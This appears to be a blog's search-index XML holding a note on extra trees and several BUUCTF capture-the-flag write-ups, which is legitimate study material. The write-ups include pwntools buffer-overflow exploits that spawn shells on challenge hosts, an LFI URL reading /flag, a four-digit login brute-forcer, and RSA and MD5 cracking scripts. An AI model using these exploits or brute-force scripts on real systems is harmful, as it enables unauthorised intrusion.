<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>極限隨機樹 extra trees</title>
      <link href="/extra-trees-regressor/"/>
      <url>/extra-trees-regressor/</url>
      
        <content type="html"><![CDATA[<p>關於極限隨機樹(extra trees)的學習筆記。</p><h3 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h3><p>極限隨機樹跟隨機森林(random forest)一樣，都是由多個決策樹(decision tree)所組成，而算法決定他們之間的差異。</p><p>隨機森林由Bagging方法抽取隨機的子樣本，創造差異的子模型後實現集成學習，決策樹的分割藉由熵(Entropy)以及Gini不純度(Gini Impurity)來在隨機子集中找出最佳的分割。</p><p>而extra trees相較於random forest，差異展現在決策樹的分割上，extra trees直接使用整個數據集，抽一個隨機的特徵以及該隨機特徵上的隨機閾值進行分割。</p><p>extra trees中的每個決策樹的隨機性比起random forest會變得更大，這代表每個子模型的性能會大大的降低，不過集成的模型數量夠大，最終集成學習的結果也會不錯，這也是extra trees這種極度隨機的集成學習具有價值的理論依據。</p><p>extra trees的這種隨機性可以用來抑製過擬合，不會因為某幾個極端的樣本點而將整個模型帶偏。這是因為每棵決策樹都是極度隨機的，所以很有可能大部分決策樹是看不到這些特別極端的樣本點的，因此整個模型的過擬合現象會得到抑制。抑製過擬合過程中降低了方差，與此同時也會增大了偏差，因此在使用extra trees之前，需要檢查樣本數據以及要解決的問題是否適合使用extra trees。</p><h3 id="演算法"><a class="markdownIt-Anchor" href="#演算法"></a> 演算法</h3><p>by <a href="https://doi.org/10.1007/s10994-006-6226-1">原始論文</a></p><p><img src="1.png" alt="" /></p><h3 id="速度上的差異"><a class="markdownIt-Anchor" href="#速度上的差異"></a> 速度上的差異</h3><p>在大資料量的數據上，random forest的訓練速度會有難以抹滅的速度劣勢，若是抽出的子數據集有n筆資料，每筆資料有m個特徵，在第一次找尋分割點的時候，就需要做(n-1)*m次的運算。</p><p>而與之相對的是extra trees可以將建立一個決策樹的node的時間縮短到k次(k為整個數據集大小)，畢竟是透過隨機選擇，速度上快上很多。</p><p>透過<a href="https://quantdare.com/what-is-the-difference-between-extra-trees-and-random-forest/">此網站</a>，可以看到</p><p><img src="results.png" alt="" /></p><p>在訓練成效上相差無幾，但速度上快許多。</p><h3 id="結論"><a class="markdownIt-Anchor" href="#結論"></a> 結論</h3><ul><li>extra trees使用整個原始樣本而不是隨機子集，從而減少了偏差，但由於不是採用最佳分割，所以也會增加偏差。</li><li>隨機化的樹算法隨機選擇每個節點的分裂點，從而減少方差。</li><li>它比隨機森林算法快得多，因為它不花時間選擇最佳分割點。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 機器學習 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ctf-real-buuctf-1</title>
      <link href="/ctf-real-buuctf-1/"/>
      <url>/ctf-real-buuctf-1/</url>
      
        <content type="html"><![CDATA[<h4 id="phpxxe"><a class="markdownIt-Anchor" href="#phpxxe"></a> [PHP]XXE</h4><p><img src="xxe.png" alt="" /></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ce5f0ee3-59bd-4c3e-a901-27bcfb348a8b&#125;</span><br></pre></td></tr></table></figure><p>進入環境之後發現有flag，提交後取得分數。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ctf-pwn-buuctf-1</title>
      <link href="/ctf-pwn-buuctf-1/"/>
      <url>/ctf-pwn-buuctf-1/</url>
      
        <content type="html"><![CDATA[<h3 id="test_your_nc"><a class="markdownIt-Anchor" href="#test_your_nc"></a> test_your_nc</h3><p>拿到一個檔案，和題目名稱為test_your_nc，先以nc連上server。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc node4.buuoj.cn 28172</span><br></pre></td></tr></table></figure><p>沒有看到任何東西，隨便輸入個字串發現提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/sh: 2: 字串: not found</span><br></pre></td></tr></table></figure><p>感覺是linux的指令，ls查看一下內容。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">pwn</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure><p>原本我忽略了裡面有什麼東西，還打開IDA來看，結果好像也只是把輸入送進stseam裡面，再看一次ls的輸出，發現就有一個flag檔，直接用cat打開來看。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag</span><br></pre></td></tr></table></figure><p>取得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5a1968c5-04dd-46e9-9832-c704e1d65513&#125;</span><br></pre></td></tr></table></figure><h3 id="rip"><a class="markdownIt-Anchor" href="#rip"></a> rip</h3><p>用IDA打開附件的程式進行反邊譯，得到下圖。</p><p><img src="rip.png" alt="" /></p><p>0000000000401191 的位置上有一個 call _system 的動作，意味著理論上只要讓程式運行到此位置即可。</p><p><img src="rip1.png" alt="" /></p><p>先用 15 個 A 來將字串s進行填充，再讓程式跳到會呼叫 system 的函式 fun 的開頭即可。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28681</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">15</span> + p64(<span class="number">0x401186</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>獲取系統權限，cat flag取得flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;3f344e2b-bf76-4e47-acdc-effdebcdeb0b&#125;</span><br></pre></td></tr></table></figure><h3 id="warmup_csaw_2016"><a class="markdownIt-Anchor" href="#warmup_csaw_2016"></a> warmup_csaw_2016</h3><p>跟上一題差不多的做法，char s配置的大小是64 bits，返回的地址是8 bits，相加等於72 bits，前面填充A，後面填要跳到的位置。</p><p><img src="warmup.png" alt="" /></p><p>進入0x40060d，執行cat flag.txt。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29603</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span> + p64(<span class="number">0x40060d</span>)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">p.writeline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>取得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-Warm Up-</span><br><span class="line">WOW:0x40060d</span><br><span class="line">&gt;flag&#123;e1cac524-0be0-43ce-9f8f-27ee1c49dc33&#125;</span><br><span class="line">timeout: the monitored command dumped core</span><br></pre></td></tr></table></figure><h3 id="ciscn_2019_n_1"><a class="markdownIt-Anchor" href="#ciscn_2019_n_1"></a> ciscn_2019_n_1</h3><p>用IDA打開附件的程式進行反邊譯，main裡面會執行func此函式，所以讓v1溢位到v2即可。</p><p><img src="ciscn_2019_n_1.png" alt="" /></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">float_to_hex</span>(<span class="params">f</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;f&#x27;</span>, f))[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26637</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">44</span> + p64(<span class="built_in">int</span>(float_to_hex(<span class="built_in">float</span>(<span class="number">11.28125</span>)), <span class="number">16</span>))</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">sh.writeline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Let&#x27;s guess the number.</span><br><span class="line">flag&#123;42d2e550-a032-4bb5-921b-055167ee15a6&#125;</span><br></pre></td></tr></table></figure><h3 id="jarvisoj_level0"><a class="markdownIt-Anchor" href="#jarvisoj_level0"></a> jarvisoj_level0</h3><p>用IDA反編譯之後找到會執行vulnerable_function。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>塞滿128個A，再塞8個返回字元的空間，之後就可以塞進要跳轉到的記憶體，取得flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400596                 public callsystem</span><br><span class="line">.text:0000000000400596 callsystem      proc near</span><br><span class="line">.text:0000000000400596                 push    rbp</span><br><span class="line">.text:0000000000400597                 mov     rbp, rsp</span><br><span class="line">.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:000000000040059F                 call    _system</span><br><span class="line">.text:00000000004005A4                 pop     rbp</span><br><span class="line">.text:00000000004005A5                 retn</span><br><span class="line">.text:00000000004005A5 callsystem      endp</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26099</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">136</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>取得flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;402780ce-1c06-4173-9c4b-6af435651a95&#125;</span><br></pre></td></tr></table></figure><h3 id="ciscn_2019_c_1"><a class="markdownIt-Anchor" href="#ciscn_2019_c_1"></a> ciscn_2019_c_1</h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ctf-basic-buuctf-1</title>
      <link href="/ctf-basic-buuctf-1/"/>
      <url>/ctf-basic-buuctf-1/</url>
      
        <content type="html"><![CDATA[<h3 id="linux-labs"><a class="markdownIt-Anchor" href="#linux-labs"></a> Linux Labs</h3><p>開啟靶機</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机信息</span><br><span class="line">剩余时间: 10782s</span><br><span class="line">node4.buuoj.cn:28112</span><br><span class="line">http://832918d2-4fb9-4168-afe8-fbbd88744ac0.node4.buuoj.cn:81</span><br></pre></td></tr></table></figure><p>輸入指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -p 28112 root@node4.buuoj.cn</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p>得到以下資訊</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bd_build  boot  etc       get-pip.py  lib    media  opt   root  sbin  sys  usr</span><br><span class="line">bin       dev   flag.txt  home        lib64  mnt    proc  run   srv   tmp  var</span><br></pre></td></tr></table></figure><p>可以把flag.txt輸出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;704a0947-a555-417a-ba05-25ff894f4388&#125;</span><br></pre></td></tr></table></figure><h3 id="buu-lfi-course-1"><a class="markdownIt-Anchor" href="#buu-lfi-course-1"></a> BUU LFI COURSE 1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机信息</span><br><span class="line">剩余时间: 10576s</span><br><span class="line">http://d1006eb4-f03f-4139-9dcc-7a077d5db8f2.node4.buuoj.cn:81</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: jinzhao</span></span><br><span class="line"><span class="comment"> * Date: 2019/7/9</span></span><br><span class="line"><span class="comment"> * Time: 7:07 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查詢了一下php語法的意思，在flie有值得時候會進行查詢。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://d1006eb4-f03f-4139-9dcc-7a077d5db8f2.node4.buuoj.cn:81/?file=/flag</span><br></pre></td></tr></table></figure><p>取得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;a4332f0e-8be8-40b5-a6bd-f5b27d0bcb6e&#125;</span><br></pre></td></tr></table></figure><h3 id="buu-brute-1"><a class="markdownIt-Anchor" href="#buu-brute-1"></a> BUU BRUTE 1</h3><p>給出一個目標網站，在輸入user:admin，password:root之後，被提示密碼為四位數字，就使用腳本爆破，得出密碼為6490，登入後得到密碼。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://e2c862dd-d97e-48d0-a4ec-1ac20aa8ed9c.node4.buuoj.cn:81/?username=admin&amp;password=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">    res = requests.get(url + <span class="built_in">str</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try :&quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;429&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        i = i-<span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> res.text != <span class="string">&quot;密码错误，为四位数字。&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登录成功。flag&#123;3599cb24-47e5-4c6e-b843-812621c4c4ec&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ctf-crypto-buuctf-3</title>
      <link href="/ctf-crypto-buuctf-3/"/>
      <url>/ctf-crypto-buuctf-3/</url>
      
        <content type="html"><![CDATA[<h3 id="rot"><a class="markdownIt-Anchor" href="#rot"></a> rot</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">破解下面的密文：</span><br><span class="line"></span><br><span class="line">83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112</span><br><span class="line"></span><br><span class="line">flag格式flag&#123;&#125;</span><br></pre></td></tr></table></figure><p>看到題目，先看前面幾個字，83在ascii當中是s，rot13後是f，以rot13對每個字元進行解碼。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112&#x27;</span></span><br><span class="line">l = s.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i)-<span class="number">13</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>初步解碼之後得到以下訊息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FLAG IS flag&#123;www_shiyanbar_com_is_very_good_????&#125;</span><br><span class="line">MD5:38e4c352809e150186920aac37190cbc</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">demo = <span class="string">&#x27;flag&#123;www_shiyanbar_com_is_very_good_&#x27;</span></span><br><span class="line">md5 = <span class="string">&#x27;38e4c352809e150186920aac37190cbc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">                tmp = demo + <span class="built_in">chr</span>(i) + <span class="built_in">chr</span>(j) + <span class="built_in">chr</span>(k) + <span class="built_in">chr</span>(m) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">                <span class="built_in">hash</span> = hashlib.md5(tmp.encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> md5 == <span class="built_in">hash</span>:</span><br><span class="line">                    <span class="built_in">print</span>(tmp)</span><br><span class="line">                    exit()</span><br></pre></td></tr></table></figure><p>進行md5爆破之後，可以解出來flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;www_shiyanbar_com_is_very_good_@8Mu&#125;</span><br></pre></td></tr></table></figure><h3 id="mrctf2020古典密碼知多少"><a class="markdownIt-Anchor" href="#mrctf2020古典密碼知多少"></a> [MRCTF2020]古典密碼知多少</h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF crypto 2</title>
      <link href="/ctf-crypto-buuctf-2/"/>
      <url>/ctf-crypto-buuctf-2/</url>
      
        <content type="html"><![CDATA[<h2 id="buuctf"><a class="markdownIt-Anchor" href="#buuctf"></a> BUUCTF</h2><h3 id="unencode"><a class="markdownIt-Anchor" href="#unencode"></a> Unencode</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">89FQA9WMD&lt;V1A&lt;V1S83DY.#&lt;W3$Q,2TM]</span><br></pre></td></tr></table></figure><p><a href="http://www.hiencode.com/uu.html">http://www.hiencode.com/uu.html</a> 用UTF-8 decoder，得到flag。</p><h3 id="afctf2018morse"><a class="markdownIt-Anchor" href="#afctf2018morse"></a> [AFCTF2018]Morse</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-..../.----/-..../-..../-..../...--/--.../....-/-..../-..../--.../-.../...--/.----/--.../...--/..---/--.../--.../....-/...../..-./--.../...--/...--/-----/...../..-./...--/...--/...--/....-/...--/...../--.../----./--.../-..</span><br></pre></td></tr></table></figure><p>感覺就是摩斯密碼，透過 <a href="http://moersima.00cha.net/cn.asp">http://moersima.00cha.net/cn.asp</a> 轉換成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">61666374667b317327745f73305f333435797d</span><br></pre></td></tr></table></figure><p>再將hex to ascii，得到flag。</p><h3 id="robomunication"><a class="markdownIt-Anchor" href="#robomunication"></a> robomunication</h3><p>題目是一段mp3，聽到耳朵死掉，本來以為是長短音，沒想到是逼啵。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">…. . .-.. .-.. — .– …. .- - .. … - …. . -.- . -.– .. - .. … -… — — .–. -… . . .–.</span><br></pre></td></tr></table></figure><p>翻譯一下變成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HELLOWHATISTHEKEYITISBOOPBEEP</span><br></pre></td></tr></table></figure><p>加上空格之後看到flag，真的會聽到暴躁。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HELLO WHAT IS THE KEY IT IS BOOPBEEP</span><br></pre></td></tr></table></figure><h3 id="dangerous-rsa"><a class="markdownIt-Anchor" href="#dangerous-rsa"></a> Dangerous RSA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#n:  0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L</span><br><span class="line">#e:  0x3</span><br><span class="line">#c:  0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span><br><span class="line">so,how to get the message?</span><br></pre></td></tr></table></figure><p>從題目來看，很明顯就是小明文攻擊，e很小的情況下直接暴力破解就可以了，送分題。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">c = <span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    m, is_true_root = gmpy2.iroot(i*n + c, e)</span><br><span class="line">    <span class="keyword">if</span> is_true_root:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found i = <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Message: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">bytearray</span>.fromhex(<span class="built_in">format</span>(m, <span class="string">&#x27;x&#x27;</span>)).decode()))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="hdctf2019basic-rsa"><a class="markdownIt-Anchor" href="#hdctf2019basic-rsa"></a> [HDCTF2019]basic rsa</h3><p>題目給了一個python的程式如下。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;*****************&quot;</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(<span class="built_in">int</span>(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br></pre></td></tr></table></figure><p>不管其他花裏胡俏的東西，這就是一個有c, n, e逆向破解的題目，直接硬幹就好，c的值應該是最下面的註解。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="number">27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>拿到flag。</p><h3 id="guet-ctf2019babyrsa"><a class="markdownIt-Anchor" href="#guet-ctf2019babyrsa"></a> [GUET-CTF2019]BabyRSA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p+q : 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span><br><span class="line">(p+1)(q+1) : 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span><br><span class="line">e : 0xe6b1bee47bd63f615c7d0a43c529d219</span><br><span class="line">d : 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span><br><span class="line">enc_flag : 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span><br></pre></td></tr></table></figure><p>有點小酷，嘗試透過一些基本的數學運算看看能不能拆出p, q，把它變成已知c, d, n下解密的RSA。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo 